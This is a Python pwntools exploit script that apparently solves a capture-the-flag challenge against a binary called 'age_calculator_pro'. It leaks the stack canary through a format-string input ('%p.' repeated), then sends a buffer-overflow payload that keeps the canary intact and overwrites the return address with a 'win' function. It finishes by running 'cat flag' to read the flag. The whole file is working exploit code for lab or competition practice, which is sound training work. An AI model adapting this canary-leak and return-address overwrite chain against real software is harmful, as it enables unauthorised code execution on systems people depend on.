#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST = os.environ.get("HOST", "localhost")
PORT = int(os.environ.get("PORT", 1337))

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), 'build/age_calculator_pro'))

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

'''.format(**locals())

io = start()

format_string = b"%p." * 20
io.sendlineafter(b"What's your name?\n", format_string)
res = io.recvuntil(b"what's your birth year?", drop=True)
canary = int(res.split(b'.')[16], 16)
print(f"[+] canary: {hex(canary)}")

payload = b"A" * 0x48
payload += p64(canary)
payload += p64(0x0)
payload += p64(exe.sym.win)
res = io.sendline(payload)
io.recvuntil(B"years old!\n")
time.sleep(0.5)
io.sendline(b"cat flag")
res = io.clean(0.5)
io.close()
print(res.decode())
